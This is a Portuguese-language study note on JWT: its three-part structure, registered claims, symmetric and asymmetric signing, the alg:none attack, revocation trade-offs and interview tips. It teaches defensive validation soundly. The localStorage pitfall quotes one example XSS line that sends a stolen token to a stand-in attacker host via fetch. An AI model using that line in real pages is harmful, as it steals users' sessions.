---
title: "JWT — estrutura, assinatura e validação"
created: 2026-06-10
updated: 2026-06-10
type: concept
progress: backlog
status: seedling
publish: true
fase: adepto
tags:
  - java
  - seguranca
  - adepto
  - jwt
aliases:
  - "JWT"
  - "JSON Web Token"
---

# JWT — estrutura, assinatura e validação

> [!abstract] TL;DR
> Um **JWT** (JSON Web Token) é um token de três partes — `header.payload.signature` — codificadas em **base64url** e unidas por pontos. Ele carrega *claims* (afirmações) **assinadas digitalmente**, o que garante integridade e autenticidade. Mas atenção: o token é **legível, não criptografado** — qualquer um decodifica o payload e lê seu conteúdo. Ao validar, confira **sempre** `iss`, `aud` e `exp`, e **nunca** confie no campo `alg` do header sem uma *whitelist* de algoritmos (sob pena do ataque `alg: none`). O JWT é **stateless** e self-contained: ótimo para escalar, ruim para revogar — esse é o seu ponto fraco.

## O que é

Um JWT é um formato compacto e seguro-para-URL de representar afirmações (*claims*) entre duas partes, padronizado na [RFC 7519](https://datatracker.ietf.org/doc/html/rfc7519). Na prática, é uma string de aparência opaca, dividida em três segmentos por pontos:

```
eyJhbGci... . eyJzdWIi... . SflKxwRJ...
   header        payload      signature
```

Cada segmento é um objeto JSON (no caso do header e payload) codificado em **base64url** — uma variante do base64 que troca os caracteres `+` e `/` por `-` e `_`, para que o token possa viajar dentro de URLs e headers HTTP sem precisar de *escaping*.

O ponto crucial: o JWT mais comum é um **JWS** (JSON Web Signature), ou seja, um token **assinado**. A RFC deixa claro que a criptografia (JWE — JSON Web Encryption) é **opcional**. Isso significa que, por padrão, o conteúdo do JWT é apenas codificado — não cifrado. A assinatura protege contra *adulteração*, não contra *leitura*.

## Por que importa

Numa arquitetura distribuída (microsserviços, SPAs, apps mobile), o servidor frequentemente não quer guardar sessão na memória nem consultar um banco a cada requisição só para saber quem é o usuário. O JWT resolve isso de forma elegante: o próprio token carrega a identidade e as permissões do usuário, *assinadas* por quem o emitiu. Qualquer serviço que confie no emissor pode validar a assinatura e confiar no conteúdo — **sem chamar de volta o servidor de autenticação**.

Isso é o coração do OAuth2 e do OpenID Connect modernos. É também a razão pela qual entender JWT é pré-requisito para configurar um *Resource Server* no Spring Security (assunto da nota 09) — afinal, a API precisa saber exatamente *como* validar o token que chega no header `Authorization: Bearer <jwt>`.

Mas com poder vem responsabilidade: um JWT mal validado é uma porta de entrada. Aceitar um token sem checar quem o emitiu, para quem ele se destina, ou se já expirou, é abrir o sistema para falsificação. E por ser self-contained, o JWT carrega armadilhas próprias que sessões tradicionais não têm.

Vale contrastar com a sessão clássica: na **sessão tradicional**, o servidor guarda o estado (quem está logado) e entrega ao cliente apenas um identificador opaco (o session ID). Toda a "verdade" mora no servidor — revogar é trivial (apaga a linha da sessão), mas a cada requisição há um lookup, e o estado precisa ser compartilhado entre instâncias. No **JWT**, a verdade viaja com o cliente, assinada: não há lookup, mas também não há um lugar central para "desligar" o token. É um trade-off deliberado de **consistência por disponibilidade/escala** — você ganha independência entre serviços e paga com a dificuldade de revogação.

## Como funciona

### As 3 partes: header.payload.signature (base64url — não é cripto)

Um JWT tem exatamente três segmentos, separados por ponto:

1. **Header** — um JSON que descreve o tipo do token e o **algoritmo de assinatura**. Exemplo: `{"alg": "RS256", "typ": "JWT"}`. O campo `alg` indica qual algoritmo foi usado para assinar.
2. **Payload** — um JSON com as *claims* (as afirmações sobre o usuário e o contexto). É aqui que moram `sub`, `exp`, `roles`, etc.
3. **Signature** — o resultado de assinar `base64url(header) + "." + base64url(payload)` com a chave do emissor, usando o algoritmo declarado no header.

> [!warning] Base64url não é criptografia
> As três partes são apenas **codificadas em base64url**, não cifradas. Qualquer pessoa que intercepte o token pode colar o payload em um decodificador (ou rodar um `base64 -d` no terminal) e ler tudo em texto claro. A codificação serve para *transporte*, não para *sigilo*. Trate o payload de um JWT como uma carta postal aberta: o lacre (assinatura) prova quem escreveu, mas o conteúdo está à vista.

A assinatura é a única parte que oferece proteção: ela garante que ninguém alterou o header ou o payload depois que o token foi emitido. Se um byte do payload mudar, a verificação da assinatura falha.

> [!example] Decodificando na mão
> Você pode confirmar a legibilidade do payload com uma única linha de shell — recortando o segmento do meio e passando por um decodificador base64:
>
> ```text
> echo "<segmento-do-meio>" | base64 -d
> ```
>
> O JSON sai em texto claro. Não há senha, nem chave, nem ritual — só decodificação. É exatamente por isso que o payload nunca deve carregar segredo.

### Claims: iss/sub/aud/exp/nbf/jti + claims customizadas

*Claims* são os pares chave-valor dentro do payload. A RFC 7519 define um conjunto de **claims registradas** (nomes curtos e reservados, todos opcionais mas padronizados):

| Claim | Nome | Significado |
| --- | --- | --- |
| `iss` | Issuer | Quem emitiu o token (o servidor de autenticação). |
| `sub` | Subject | O sujeito do token — tipicamente o ID do usuário. |
| `aud` | Audience | Para quem o token se destina (qual serviço deve aceitá-lo). |
| `exp` | Expiration Time | Instante (NumericDate) a partir do qual o token **não deve mais** ser aceito. |
| `nbf` | Not Before | Instante antes do qual o token **ainda não vale**. |
| `iat` | Issued At | Quando o token foi emitido — útil para calcular sua idade. |
| `jti` | JWT ID | Identificador único do token — ajuda a prevenir *replay*. |

Além dessas, o emissor pode adicionar **claims customizadas** — qualquer chave que faça sentido para a aplicação, como `roles`, `scope`, `email` ou `tenant`. São essas claims customizadas que tipicamente alimentam a autorização (decidir o que o usuário pode fazer).

> [!tip] As três que você sempre valida
> `iss` (de quem veio?), `aud` (era pra mim?) e `exp` (ainda vale?). Essas três checagens são o mínimo absoluto de uma validação correta. Pular qualquer uma é um buraco de segurança.

### Assinatura: RS256/ES256 (assimétrico) vs HS256 (simétrico)

O algoritmo da assinatura, declarado no `alg`, cai em duas grandes famílias:

- **Simétrico (HS256)** — usa **uma única chave secreta** compartilhada (HMAC com SHA-256). Quem assina e quem verifica usam *a mesma chave*. Simples, mas exige que todos os serviços que validam o token também conheçam o segredo — o que aumenta a superfície de exposição da chave. Se um serviço de validação vazar o segredo, o atacante pode **forjar tokens**.

- **Assimétrico (RS256, ES256)** — usa um **par de chaves**: o emissor assina com a **chave privada**, e qualquer serviço verifica com a **chave pública** correspondente. `RS256` é RSA com SHA-256; `ES256` é ECDSA (curvas elípticas) com SHA-256, geralmente mais compacto e rápido. A vantagem decisiva: os serviços de validação só precisam da **chave pública** — não há segredo compartilhado para vazar. Por isso o assimétrico é a escolha padrão em arquiteturas distribuídas e no OpenID Connect (onde a chave pública é publicada via JWKS).

Regra de bolso: **um emissor, muitos validadores → assimétrico** (RS256/ES256). Só o emissor guarda a chave privada; o resto do mundo valida com a pública.

Na prática distribuída, a chave pública não é nem mesmo copiada manualmente para cada serviço: o emissor a publica em um endpoint **JWKS** (JSON Web Key Set), e os validadores a buscam e cacheiam dinamicamente. Isso permite **rotação de chaves** sem reconfigurar cada serviço — o campo `kid` (key ID) no header do token diz qual chave do conjunto foi usada. Esse é precisamente o mecanismo que um *Resource Server* configura ao apontar para o `issuer-uri`, detalhado na nota de OAuth2.

### alg: none e a whitelist de algoritmos

O campo `alg` viaja **dentro do header do próprio token** — ou seja, é informação fornecida por quem mandou o token, e um atacante controla quem manda o token. Aí mora um perigo histórico.

A especificação JWT prevê um valor `alg: none`, que significa "token *sem* assinatura". A ideia original era para casos onde a integridade já é garantida por outro meio. O problema: **algumas bibliotecas, por anos, trataram um token com `alg: none` como um token de assinatura válida e verificada**. Um atacante então pode pegar um token legítimo, trocar o header para `{"alg":"none"}`, reescrever o payload à vontade (virar `admin`, por exemplo), remover a assinatura — e a biblioteca aceita.

A defesa é conceitualmente simples e **não negociável**: ao validar, **nunca leia o algoritmo do header do token para decidir como verificar**. Em vez disso, declare *explicitamente* qual(is) algoritmo(s) você aceita — uma **whitelist**. Se o token chega com `alg: none` ou com qualquer algoritmo fora da lista, ele é rejeitado antes de qualquer outra coisa.

```java
// Bom: o algoritmo esperado é fixado pela aplicação, não lido do token
DecodedJWT jwt = JWT.require(Algorithm.HMAC256(secret))
                    .withIssuer("https://auth.example.com")
                    .build()
                    .verify(token);
```

A mesma família de problemas inclui o **algorithm confusion** (forçar um servidor configurado para RS256 a tratar a chave pública RSA como segredo HMAC). A whitelist rígida de algoritmos resolve ambos.

> [!info] Por que isso foi tão comum
> O `alg: none` não é um bug exótico de uma única biblioteca — foi um problema *de design* que afetou múltiplas implementações ao longo dos anos, justamente porque a especificação prevê o valor e algumas APIs deixavam a verificação "inferir" o algoritmo do token. A lição é geral: **nunca deixe o dado não-confiável (o token do atacante) escolher como ele próprio será verificado**. O algoritmo de verificação é uma decisão da aplicação, fixada em configuração — não um campo lido do token.

### Stateless: prós (portável, self-contained) e contras (revogação)

O JWT é **stateless**: tudo que o validador precisa está no próprio token e na chave de verificação. Isso traz vantagens reais:

- **Self-contained** — a identidade e as permissões viajam no token; não há lookup de sessão.
- **Portável** — qualquer serviço com a chave pública valida, sem estado compartilhado nem banco de sessões.
- **Escalável** — não há sessão centralizada para virar gargalo; o sistema escala horizontalmente sem afinidade de sessão.

O custo dessa elegância é o **calcanhar de Aquiles: revogação**. Como o servidor não guarda estado do token, ele não tem um "interruptor" simples para invalidá-lo. Se um JWT vaza, ele continua válido até o `exp` expirar — não há, por padrão, como "desligá-lo" no meio do caminho.

A mitigação prática é manter o `exp` **curto** (minutos) e usar *refresh tokens* para renovar o acesso, combinando isso a uma lista de revogação quando necessário. Esse mecanismo de revogação e renovação é o tema da nota [[03-Dominios/Java/Segurança/13 - Refresh tokens e revogação de token|Refresh tokens e revogação de token]] — aqui basta saber que ele *existe* e que é a resposta direta para a fraqueza do modelo stateless.

> [!question] "Se é stateless, como eu deslogo alguém imediatamente?"
> Essa é a pergunta-armadilha em entrevistas sobre JWT. A resposta honesta: você **não consegue** invalidar um *access token* JWT puro antes do `exp` sem reintroduzir estado. As saídas reais são (a) manter o access token de vida muito curta, de modo que a janela de exposição seja mínima, e (b) controlar a *renovação* via refresh token revogável — você nega o próximo refresh, e o access morre sozinho em minutos. Se o requisito for revogação *instantânea*, mantém-se uma *denylist* de `jti` consultada na validação — o que, ironicamente, reintroduz o estado que o JWT prometia eliminar. Reconhecer esse trade-off explicitamente é o que separa uma resposta sênior de uma decorada.

## Na prática

Um JWT decodificado se separa em duas partes legíveis. O **header**:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "k-2026-06"
}
```

E o **payload** — repare nas claims registradas (`iss`, `sub`, `aud`, `exp`, `iat`) e em claims customizadas (`roles`, `scope`):

```json
{
  "iss": "https://auth.example.com",
  "sub": "user-9f3c1a2b",
  "aud": "orders-api",
  "exp": 1781452800,
  "iat": 1781449200,
  "jti": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
  "roles": ["USER", "EDITOR"],
  "scope": "read:orders write:orders"
}
```

> [!danger] Esse payload é só base64 — qualquer um lê
> O bloco acima não está protegido por sigilo: ele é exatamente o que sai ao decodificar o segundo segmento de um JWT. Não há nenhuma "senha" para abrir esse conteúdo. Qualquer pessoa que ponha as mãos no token vê `sub`, `roles`, `scope` e tudo o mais. A assinatura impede *alteração*, não *leitura*.

Serializado, o token completo é apenas os três segmentos base64url unidos por pontos (valores abreviados aqui):

```text
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImstMjAyNi0wNiJ9.eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20iLCJzdWIiOiJ1c2VyLTlmM2MxYTJiIiwiYXVkIjoib3JkZXJzLWFwaSIsImV4cCI6MTc4MTQ1MjgwMH0.NHVaYe26MbtOYhSKkoKYdFVomg4i8ZJd8_-RU8VNbftc4TSMb4bXP3l3YlNWACwyXPGffz5aXHc6lty1Y2t4SWRqGteragsVdZufDn5BlnJl9pdR_kdVFUsra2rWKEofkZeIC4yWytE58sMIihvo9H1ScmmVwBcQP6XETqYd0aSHp1gOaZ
```

Quem precisa apenas *inspecionar* (e não validar) um JWT pode colá-lo em ferramentas de debug, mas em produção a validação deve ser feita por uma biblioteca testada, com a whitelist de algoritmos e as checagens de `iss`/`aud`/`exp` ativas.

A ordem mental de uma validação correta é sempre a mesma — vale memorizá-la como uma checklist:

1. **Algoritmo** — o `alg` do token está na minha whitelist? Se for `none` ou algo fora da lista, rejeita já.
2. **Assinatura** — recomputo a assinatura com a chave esperada (pública, no caso de RS256/ES256) e comparo. Falhou? Rejeita.
3. **Emissor** — `iss` é exatamente o emissor em que confio?
4. **Destinatário** — `aud` contém o identificador *deste* serviço?
5. **Tempo** — `exp` ainda não passou e `nbf` (se houver) já passou, considerando um *clock skew* pequeno e tolerado?
6. **Só então** — leio as claims customizadas (`roles`, `scope`) para autorizar.

Pular do passo 2 direto para o 6 — confiar nas claims só porque a assinatura bateu — é o erro clássico das armadilhas (2) e (3) a seguir.

## Armadilhas

### (1) `alg: none` aceito como token válido

**O problema:** uma biblioteca (ou configuração) que lê o `alg` do header do token para decidir como verificar pode aceitar `alg: none` como "assinatura verificada". Como o atacante controla o token, ele troca o header para `{"alg":"none"}`, reescreve o payload (vira `admin`), remove a assinatura — e passa.

**Exemplo:** o atacante captura um JWT legítimo de um usuário comum, edita o payload para `"roles": ["ADMIN"]`, seta `alg: none`, e envia. Um validador ingênuo confia.

**Fix:** **sempre** use uma **whitelist de algoritmos** no validador. Declare explicitamente o algoritmo esperado (ex.: `RS256`) e rejeite qualquer outro, incluindo `none`, *antes* de inspecionar o conteúdo. Nunca derive o algoritmo de verificação a partir do header do token.

### (2) Não validar `aud` e `iss`

**O problema:** validar apenas a assinatura e o `exp`, mas ignorar quem emitiu (`iss`) e para quem o token se destina (`aud`). Um token assinado por um emissor legítimo para *outro* serviço pode ser reaproveitado contra o seu.

**Exemplo:** o serviço `reports-api` aceita qualquer token bem-assinado pelo emissor corporativo. Um token emitido legitimamente para `analytics-api` (com `aud: "analytics-api"`) é então reapresentado em `reports-api` — e, sem checagem de `aud`, é aceito indevidamente.

**Fix:** valide **sempre** `iss` (deve ser exatamente o emissor que você confia) e `aud` (deve conter o identificador do *seu* serviço). Combine com a checagem de `exp` (e `nbf`, quando presente). No Spring/Nimbus, configure os validadores de issuer e audience explicitamente.

### (3) Claim sensível no payload

**O problema:** colocar dado sensível no payload achando que ele está "protegido". O payload é só base64url — **qualquer um lê**.

**Exemplo:** incluir `"password": "..."`, número de documento, dados de saúde ou um segredo de integração dentro do JWT. Como o token frequentemente é guardado no cliente e trafega em logs/proxies, esse dado fica exposto a quem quer que toque no token.

**Fix:** **nunca** ponha senha, segredo ou dado pessoal sensível no payload. Carregue apenas o mínimo necessário para identificar o usuário e autorizar (ex.: `sub`, `roles`, `scope`). Se houver necessidade real de sigilo no token, use JWE (token *cifrado*), não confie na codificação.

### (4) JWT em `localStorage` (XSS rouba o token)

**O problema:** guardar o JWT em `localStorage` no navegador. Esse armazenamento é acessível a qualquer JavaScript da página — então uma falha de **XSS** permite que o script malicioso leia o token e o exfiltre.

**Exemplo:** um script injetado via XSS executa `fetch('https://atacante.example/steal?t=' + localStorage.getItem('token'))` e rouba a sessão do usuário.

**Fix:** prefira armazenar o token em cookie `HttpOnly`, `Secure` e `SameSite` (inacessível ao JavaScript), ou em `sessionStorage` com controles rígidos (expiração curta, rotação). Trate XSS na raiz: *output encoding* e CSP. O armazenamento seguro do token é tão importante quanto a sua validação.

## Em entrevista

### Frase pronta (inglês)

> A JWT is a compact, URL-safe token with three base64url-encoded parts — header, payload, and signature — that carries signed claims about a principal. The signature guarantees integrity and authenticity, but the payload is only encoded, not encrypted, so I never put sensitive data in it and treat it as publicly readable. When validating, I always pin the expected algorithm with an allow-list to defeat the `alg: none` and algorithm-confusion attacks, and I verify the registered claims — issuer, audience, and expiration — before trusting any custom claim. The main trade-off is that JWTs are stateless and self-contained, which scales well but makes revocation hard, so I keep expirations short and pair them with refresh tokens.

Se o entrevistador insistir num ponto, o gancho mais forte é o trade-off de revogação: deixe claro que você *entende* por que o JWT é difícil de revogar (não há estado no servidor) e que isso é uma escolha consciente, não um descuido — e então cite a mitigação (vida curta + refresh revogável). Demonstrar que você conhece o *custo* da abordagem, e não só seus benefícios, é o que sinaliza senioridade.

### Vocabulário

| Termo (EN) | Tradução / sentido |
| --- | --- |
| claim | afirmação/asserção carregada no token |
| signed (not encrypted) | assinado (não criptografado) |
| tamper-proof / integrity | à prova de adulteração / integridade |
| allow-list (whitelist) of algorithms | lista de algoritmos permitidos |
| issuer / audience | emissor / destinatário (público-alvo) |
| stateless / self-contained | sem estado / autocontido |
| symmetric vs asymmetric signing | assinatura simétrica vs assimétrica |
| token revocation | revogação de token |
| short-lived / long-lived token | token de vida curta / longa |
| to forge a token | forjar/falsificar um token |
| public/private key pair | par de chaves pública/privada |
| bearer token | token portador (`Authorization: Bearer`) |

## Veja também

- [[03-Dominios/Java/Segurança/09 - OAuth2 Resource Server — validando JWT na API|OAuth2 Resource Server]]
- [[03-Dominios/Java/Segurança/13 - Refresh tokens e revogação de token|Refresh tokens e revogação de token]]
- [[03-Dominios/Java/Segurança/17 - Uma request autenticada do token à autorização no método|Uma request autenticada de ponta a ponta]]
- [[03-Dominios/Java/Segurança/index|Segurança (MOC do galho)]]
- [[03-Dominios/Java/index|Trilha Java]]
- [[03-Dominios/Java/Dicionário de Java]]

## Referências

- [RFC 7519 — JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519) — define a estrutura, as claims registradas (`iss`/`sub`/`aud`/`exp`/`nbf`/`iat`/`jti`) e o uso de JWS/JWE.
- [OWASP — JSON Web Token for Java Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) — recomendações de segurança: whitelist de algoritmos contra `alg: none`, validação de claims, e armazenamento do token.
- [RFC 7515 — JSON Web Signature (JWS)](https://datatracker.ietf.org/doc/html/rfc7515) — define o mecanismo de assinatura usado pela maioria dos JWTs (a parte `signature`).
- [RFC 7517 — JSON Web Key (JWK/JWKS)](https://datatracker.ietf.org/doc/html/rfc7517) — define o formato das chaves públicas publicadas para validação de assinatura (referenciadas pelo `kid`).
